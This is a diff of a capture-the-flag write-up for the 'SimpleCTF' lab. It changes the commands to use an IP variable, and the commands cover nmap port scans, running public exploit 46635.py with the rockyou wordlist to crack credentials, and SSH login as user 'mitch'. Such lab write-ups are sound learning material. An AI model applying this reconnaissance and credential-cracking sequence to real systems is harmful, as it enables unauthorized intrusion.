@@ -1,8 +1,14 @@
 # SimpleCTF
 
 ## #1 How many services are running under port 1000?
+Save ip as a variable
 ```
-nmap <ip>
+export ip=<ip>
+```
+
+Run Nmap scan to scan the host for open ports
+```
+nmap $ip
 21/tcp   closed ftp
 80/tcp   closed http
 2222/tcp closed EtherNetIP-1
@@ -10,7 +16,7 @@ nmap <ip>
 2
 ## #2 What is running on the higher port?
 ```
-nmap -p2222 -sV -sC <ip>
+nmap -p2222 -sV -sC $ip
 
 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 ```
@@ -36,7 +42,7 @@ searchsploit -m php/webapps/46635.py
 
 Using the exploit to get username and password
 ```
-python 46635.py -u http:// /simple -c -w /opt/rockyou.txt
+python 46635.py -u http://$ip/simple -c -w /opt/rockyou.txt
 ```
 Result:
 ```
@@ -50,7 +56,7 @@ Result:
 ## #6 Where can you login with the details obtained?
 Connect to SSH
 ```
-ssh mitch@10.10.209.209 -p 2222
+ssh mitch@$ip -p 2222
 ```
 
 ## #7 What's the user flag?
